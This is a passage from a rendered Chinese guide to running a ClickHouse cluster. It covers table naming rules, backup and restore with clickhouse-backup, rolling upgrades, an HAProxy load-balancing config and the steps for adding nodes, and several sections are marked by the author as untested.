&lt;li data-task="x" title="已完成"&gt;&lt;i class="checkbox-icon fa-fw fa-solid fa-check-square" aria-hidden="true"&gt;&lt;/i&gt;&lt;code&gt;order_detail&lt;/code&gt;（缺少层级、来源）&lt;/li&gt;
&lt;li data-task="x" title="已完成"&gt;&lt;i class="checkbox-icon fa-fw fa-solid fa-check-square" aria-hidden="true"&gt;&lt;/i&gt;&lt;code&gt;ods_trade_order_v2&lt;/code&gt;（版本号禁止）&lt;/li&gt;
&lt;li data-task="x" title="已完成"&gt;&lt;i class="checkbox-icon fa-fw fa-solid fa-check-square" aria-hidden="true"&gt;&lt;/i&gt;&lt;code&gt;user_order_local&lt;/code&gt;（语义不完整）&lt;/li&gt;
&lt;li data-task="x" title="已完成"&gt;&lt;i class="checkbox-icon fa-fw fa-solid fa-check-square" aria-hidden="true"&gt;&lt;/i&gt;&lt;code&gt;trade_order_dist&lt;/code&gt;（表类型不进表名）&lt;/li&gt;
&lt;li data-task="x" title="已完成"&gt;&lt;i class="checkbox-icon fa-fw fa-solid fa-check-square" aria-hidden="true"&gt;&lt;/i&gt;&lt;code&gt;prod_dwd_order&lt;/code&gt;（环境不进表名）&lt;/li&gt;
&lt;/ul&gt;
&lt;h3 class="heading-element" id="1011-推荐最终对照表"&gt;&lt;span&gt;10.11. 推荐最终对照表&lt;/span&gt;
 &lt;a href="#1011-%e6%8e%a8%e8%8d%90%e6%9c%80%e7%bb%88%e5%af%b9%e7%85%a7%e8%a1%a8" class="heading-mark"&gt;
 &lt;svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"&gt;&lt;path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"&gt;&lt;/path&gt;&lt;/svg&gt;
 &lt;/a&gt;
&lt;/h3&gt;&lt;table&gt;
 &lt;thead&gt;
 &lt;tr&gt;
 &lt;th&gt;类型&lt;/th&gt;
 &lt;th&gt;表名&lt;/th&gt;
 &lt;/tr&gt;
 &lt;/thead&gt;
 &lt;tbody&gt;
 &lt;tr&gt;
 &lt;td&gt;本地表&lt;/td&gt;
 &lt;td&gt;&lt;code&gt;dwd_erp_trade_order_detail_day_local&lt;/code&gt;&lt;/td&gt;
 &lt;/tr&gt;
 &lt;tr&gt;
 &lt;td&gt;分布式表&lt;/td&gt;
 &lt;td&gt;&lt;code&gt;dwd_erp_trade_order_detail_day&lt;/code&gt;&lt;/td&gt;
 &lt;/tr&gt;
 &lt;tr&gt;
 &lt;td&gt;ZK Path&lt;/td&gt;
 &lt;td&gt;&lt;code&gt;/clickhouse/tables/{shard}/&amp;lt;db_name&amp;gt;/&amp;lt;table_name&amp;gt;&lt;/code&gt;&lt;/td&gt;
 &lt;/tr&gt;
 &lt;/tbody&gt;
&lt;/table&gt;
&lt;h2 class="heading-element" id="11-备份与恢复未测试"&gt;&lt;span&gt;11. 备份与恢复(未测试)&lt;/span&gt;
 &lt;a href="#11-%e5%a4%87%e4%bb%bd%e4%b8%8e%e6%81%a2%e5%a4%8d%e6%9c%aa%e6%b5%8b%e8%af%95" class="heading-mark"&gt;
 &lt;svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"&gt;&lt;path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"&gt;&lt;/path&gt;&lt;/svg&gt;
 &lt;/a&gt;
&lt;/h2&gt;&lt;h3 class="heading-element" id="111-推荐工具clickhouse-backup"&gt;&lt;span&gt;11.1. 推荐工具：clickhouse-backup&lt;/span&gt;
 &lt;a href="#111-%e6%8e%a8%e8%8d%90%e5%b7%a5%e5%85%b7clickhouse-backup" class="heading-mark"&gt;
 &lt;svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"&gt;&lt;path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"&gt;&lt;/path&gt;&lt;/svg&gt;
 &lt;/a&gt;
&lt;/h3&gt;&lt;p&gt;&lt;strong&gt;部署位置&lt;/strong&gt;：
👉 每个 &lt;code&gt;ClickHouse&lt;/code&gt; 节点（或运维机）&lt;/p&gt;
&lt;hr&gt;
&lt;h3 class="heading-element" id="112-创建备份"&gt;&lt;span&gt;11.2. 创建备份&lt;/span&gt;
 &lt;a href="#112-%e5%88%9b%e5%bb%ba%e5%a4%87%e4%bb%bd" class="heading-mark"&gt;
 &lt;svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"&gt;&lt;path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"&gt;&lt;/path&gt;&lt;/svg&gt;
 &lt;/a&gt;
&lt;/h3&gt;&lt;p&gt;包含：&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;表结构&lt;/li&gt;
&lt;li&gt;数据（支持增量）&lt;/li&gt;
&lt;/ul&gt;
&lt;pre&gt;&lt;code&gt;clickhouse-backup create daily_2025_12_18&lt;/code&gt;&lt;/pre&gt;&lt;hr&gt;
&lt;h3 class="heading-element" id="113-恢复示例单表"&gt;&lt;span&gt;11.3. 恢复示例（单表）&lt;/span&gt;
 &lt;a href="#113-%e6%81%a2%e5%a4%8d%e7%a4%ba%e4%be%8b%e5%8d%95%e8%a1%a8" class="heading-mark"&gt;
 &lt;svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"&gt;&lt;path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"&gt;&lt;/path&gt;&lt;/svg&gt;
 &lt;/a&gt;
&lt;/h3&gt;&lt;pre&gt;&lt;code&gt;clickhouse-backup restore --table dbtest.test_table daily_2025_12_18&lt;/code&gt;&lt;/pre&gt;&lt;h3 class="heading-element" id="114-恢复整个数据库"&gt;&lt;span&gt;11.4. 恢复整个数据库&lt;/span&gt;
 &lt;a href="#114-%e6%81%a2%e5%a4%8d%e6%95%b4%e4%b8%aa%e6%95%b0%e6%8d%ae%e5%ba%93" class="heading-mark"&gt;
 &lt;svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"&gt;&lt;path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"&gt;&lt;/path&gt;&lt;/svg&gt;
 &lt;/a&gt;
&lt;/h3&gt;&lt;pre&gt;&lt;code&gt;clickhouse-backup restore daily_2025_12_18&lt;/code&gt;&lt;/pre&gt;&lt;h3 class="heading-element" id="115-其他"&gt;&lt;span&gt;11.5. 其他&lt;/span&gt;
 &lt;a href="#115-%e5%85%b6%e4%bb%96" class="heading-mark"&gt;
 &lt;svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"&gt;&lt;path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"&gt;&lt;/path&gt;&lt;/svg&gt;
 &lt;/a&gt;
&lt;/h3&gt;&lt;ul&gt;
&lt;li&gt;备份 &lt;code&gt;/var/lib/clickhouse&lt;/code&gt; 目录(最后防线,但可能不靠谱)&lt;/li&gt;
&lt;/ul&gt;
&lt;hr&gt;
&lt;h2 class="heading-element" id="12-升级和迁移未测试"&gt;&lt;span&gt;12. 升级和迁移(未测试)&lt;/span&gt;
 &lt;a href="#12-%e5%8d%87%e7%ba%a7%e5%92%8c%e8%bf%81%e7%a7%bb%e6%9c%aa%e6%b5%8b%e8%af%95" class="heading-mark"&gt;
 &lt;svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"&gt;&lt;path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"&gt;&lt;/path&gt;&lt;/svg&gt;
 &lt;/a&gt;
&lt;/h2&gt;&lt;ul&gt;
&lt;li&gt;要求：&lt;/li&gt;
&lt;/ul&gt;
&lt;ul&gt;
&lt;li&gt;副本 ≥ 2&lt;/li&gt;
&lt;li&gt;Keeper 存活&lt;/li&gt;
&lt;/ul&gt;
&lt;h3 class="heading-element" id="121-正确姿势滚动升级"&gt;&lt;span&gt;12.1. 正确姿势：滚动升级&lt;/span&gt;
 &lt;a href="#121-%e6%ad%a3%e7%a1%ae%e5%a7%bf%e5%8a%bf%e6%bb%9a%e5%8a%a8%e5%8d%87%e7%ba%a7" class="heading-mark"&gt;
 &lt;svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"&gt;&lt;path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"&gt;&lt;/path&gt;&lt;/svg&gt;
 &lt;/a&gt;
&lt;/h3&gt;&lt;pre&gt;&lt;code&gt;node1 升级 → OK
node2 升级 → OK&lt;/code&gt;&lt;/pre&gt;&lt;h3 class="heading-element" id="122-升级前必做"&gt;&lt;span&gt;12.2. 升级前必做：&lt;/span&gt;
 &lt;a href="#122-%e5%8d%87%e7%ba%a7%e5%89%8d%e5%bf%85%e5%81%9a" class="heading-mark"&gt;
 &lt;svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"&gt;&lt;path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"&gt;&lt;/path&gt;&lt;/svg&gt;
 &lt;/a&gt;
&lt;/h3&gt;&lt;pre&gt;&lt;code&gt;-- 强制同步
SYSTEM SYNC REPLICA;&lt;/code&gt;&lt;/pre&gt;&lt;h3 class="heading-element" id="123-迁移换机器--扩容"&gt;&lt;span&gt;12.3. 迁移（换机器 / 扩容）&lt;/span&gt;
 &lt;a href="#123-%e8%bf%81%e7%a7%bb%e6%8d%a2%e6%9c%ba%e5%99%a8--%e6%89%a9%e5%ae%b9" class="heading-mark"&gt;
 &lt;svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"&gt;&lt;path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"&gt;&lt;/path&gt;&lt;/svg&gt;
 &lt;/a&gt;
&lt;/h3&gt;&lt;p&gt;正确方式:&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;新节点上线&lt;/li&gt;
&lt;li&gt;加入 &lt;code&gt;cluster.xml&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;&lt;code&gt;Replicated&lt;/code&gt; 表自动同步&lt;/li&gt;
&lt;li&gt;移除旧节点&lt;/li&gt;
&lt;/ul&gt;
&lt;h2 class="heading-element" id="13-高可用未测试"&gt;&lt;span&gt;13. 高可用(未测试)&lt;/span&gt;
 &lt;a href="#13-%e9%ab%98%e5%8f%af%e7%94%a8%e6%9c%aa%e6%b5%8b%e8%af%95" class="heading-mark"&gt;
 &lt;svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"&gt;&lt;path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"&gt;&lt;/path&gt;&lt;/svg&gt;
 &lt;/a&gt;
&lt;/h2&gt;&lt;h3 class="heading-element" id="131-自动重试-9000-端口"&gt;&lt;span&gt;13.1. 自动重试 9000 端口&lt;/span&gt;
 &lt;a href="#131-%e8%87%aa%e5%8a%a8%e9%87%8d%e8%af%95-9000-%e7%ab%af%e5%8f%a3" class="heading-mark"&gt;
 &lt;svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"&gt;&lt;path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"&gt;&lt;/path&gt;&lt;/svg&gt;
 &lt;/a&gt;
&lt;/h3&gt;&lt;h3 class="heading-element" id="132-haproxy"&gt;&lt;span&gt;13.2. HAProxy&lt;/span&gt;
 &lt;a href="#132-haproxy" class="heading-mark"&gt;
 &lt;svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"&gt;&lt;path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"&gt;&lt;/path&gt;&lt;/svg&gt;
 &lt;/a&gt;
&lt;/h3&gt;&lt;ul&gt;
&lt;li&gt;支持 &lt;code&gt;TCP&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;健康检查好&lt;/li&gt;
&lt;li&gt;性能稳定&lt;/li&gt;
&lt;/ul&gt;
&lt;pre&gt;&lt;code&gt;frontend clickhouse
 bind *:9000
 default_backend ch_nodes

backend ch_nodes
 balance roundrobin
 server n1 172.31.10.11:9000 check
 server n2 172.31.10.110:9000 check&lt;/code&gt;&lt;/pre&gt;&lt;h3 class="heading-element" id="133-不推荐-nginx除非-http"&gt;&lt;span&gt;13.3. 不推荐 Nginx（除非 HTTP）&lt;/span&gt;
 &lt;a href="#133-%e4%b8%8d%e6%8e%a8%e8%8d%90-nginx%e9%99%a4%e9%9d%9e-http" class="heading-mark"&gt;
 &lt;svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"&gt;&lt;path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"&gt;&lt;/path&gt;&lt;/svg&gt;
 &lt;/a&gt;
&lt;/h3&gt;&lt;p&gt;&lt;code&gt;Nginx&lt;/code&gt;：&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;更适合 &lt;code&gt;8123&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;不适合高并发 &lt;code&gt;TCP&lt;/code&gt; 查询&lt;/li&gt;
&lt;/ul&gt;
&lt;h2 class="heading-element" id="14-扩容与自动复制是如何发生的"&gt;&lt;span&gt;14. 扩容与自动复制是如何发生的？&lt;/span&gt;
 &lt;a href="#14-%e6%89%a9%e5%ae%b9%e4%b8%8e%e8%87%aa%e5%8a%a8%e5%a4%8d%e5%88%b6%e6%98%af%e5%a6%82%e4%bd%95%e5%8f%91%e7%94%9f%e7%9a%84" class="heading-mark"&gt;
 &lt;svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"&gt;&lt;path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"&gt;&lt;/path&gt;&lt;/svg&gt;
 &lt;/a&gt;
&lt;/h2&gt;&lt;h3 class="heading-element" id="141-如何新增节点"&gt;&lt;span&gt;14.1. 如何新增节点？&lt;/span&gt;
 &lt;a href="#141-%e5%a6%82%e4%bd%95%e6%96%b0%e5%a2%9e%e8%8a%82%e7%82%b9" class="heading-mark"&gt;
 &lt;svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"&gt;&lt;path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"&gt;&lt;/path&gt;&lt;/svg&gt;
 &lt;/a&gt;
&lt;/h3&gt;&lt;p&gt;&lt;em&gt;&lt;strong&gt;所有需要调整的配置项，在配置文件模板中均有定义，可以自行参考阅读&lt;/strong&gt;&lt;/em&gt;&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;
&lt;p&gt;主节点和新增节点的 &lt;a href="#5-%e9%9b%86%e7%be%a4%e9%85%8d%e7%bd%aeclusterxml"&gt;&lt;code&gt;cluster.xml&lt;/code&gt;&lt;/a&gt;、&lt;a href="#62-keeperxml%e6%9c%80%e5%b0%8f%e5%8f%af%e7%94%a8%e5%8d%95%e8%8a%82%e7%82%b9"&gt;&lt;code&gt;keeper.xml&lt;/code&gt;&lt;/a&gt; 、&lt;a href="#82-%e9%ab%98%e5%8f%af%e7%94%a8%e7%89%88%e6%9c%ac%e6%8e%a8%e8%8d%90%e7%94%9f%e4%ba%a7"&gt;&lt;code&gt;macros.xml&lt;/code&gt;&lt;/a&gt;、&lt;a href="#72-storagexml"&gt;&lt;code&gt;storage.xml&lt;/code&gt;&lt;/a&gt; 配置文件需要保持高度一致，以下是需要修改的地方&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;
&lt;p&gt;&lt;code&gt;cluster.xml&lt;/code&gt;&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;&lt;code&gt;interserver_http_host&lt;/code&gt; 项, 值对应当前节点的 &lt;code&gt;IP&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;&lt;code&gt;shard&lt;/code&gt; 项, 在下面添加一个 &lt;code&gt;replica&lt;/code&gt; 副本节点(&lt;em&gt;注: 若是分片就添加一个&lt;code&gt;shard&lt;/code&gt;&lt;/em&gt;)&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;&lt;code&gt;keeper.xml&lt;/code&gt;, &lt;code&gt;keeper.xml&lt;/code&gt; 配置文件对于无论对于哪一个节点来说，除了 &lt;code&gt;server_id&lt;/code&gt; 不一样外，其他应完全一样&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;&lt;code&gt;server_id&lt;/code&gt; 项, 各个节点保持唯一&lt;/li&gt;
